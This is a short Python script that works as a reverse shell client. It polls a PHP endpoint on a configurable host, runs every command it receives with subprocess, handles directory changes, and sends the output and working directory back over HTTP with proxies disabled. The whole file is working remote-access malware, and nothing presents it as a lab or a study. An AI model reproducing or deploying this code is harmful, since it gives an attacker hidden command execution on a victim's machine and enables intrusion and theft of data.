import requests,subprocess,time,os,json

URL = "localhost:1212" #Do not put http\s

proxies = {
  "http": None,
  "https": None,
}

def Send_data(result):
    requests.post(
        f"http://{URL}/rev-shell/recv_in_serv.php",
        data={
            "get_data": json.dumps(
                {"output": result, "getcwd": os.getcwd() + "> "}
            )
        },proxies=proxies
    )


def Recv_data():
    return requests.get(f"http://{URL}/rev-shell/recv_in_serv.php",proxies=proxies).text



while True:
    time.sleep(1)

    data = Recv_data()

    if data == "":
        pass

    elif data == "give_me_path":
        Send_data("")


    elif data[0:2] == "cd":
        try:
            os.chdir(data[3:])
            Send_data("Changed Directory !")
            continue

        except:
            Send_data("Not Found ):")
            continue


    else:
        Send_data(subprocess.getoutput(data))

